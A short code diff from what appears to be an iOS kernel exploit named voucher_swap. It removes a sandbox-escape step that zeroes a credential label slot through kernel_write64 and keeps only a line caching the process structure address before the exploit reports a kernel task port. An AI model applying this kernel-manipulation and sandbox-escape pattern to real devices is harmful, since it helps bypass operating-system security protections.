@@ -1142,12 +1142,9 @@ voucher_swap() {
 	SafeFreeNULL(pipe_buffer);
 	mach_port_destroy(mach_task_self(), base_port);
     
-    // 30. Unsandbox
+    // 30. Cache our proc_t address
     extern uint64_t cached_proc_struct_addr;
-    uint64_t selfproc = cached_proc_struct_addr = kernel_read64(current_task + OFFSET(task, bsd_info));
-    uint64_t ucred = kernel_read64(selfproc + OFFSET(proc, p_ucred));
-    uint64_t cr_label = kernel_read64(ucred + 0x78);
-    kernel_write64(cr_label + 0x10, 0);
+    cached_proc_struct_addr = kernel_read64(current_task + OFFSET(task, bsd_info));
 
 	// And that's it! Enjoy kernel read/write via kernel_task_port.
 	INFO("done! port 0x%x is tfp0", kernel_task_port);
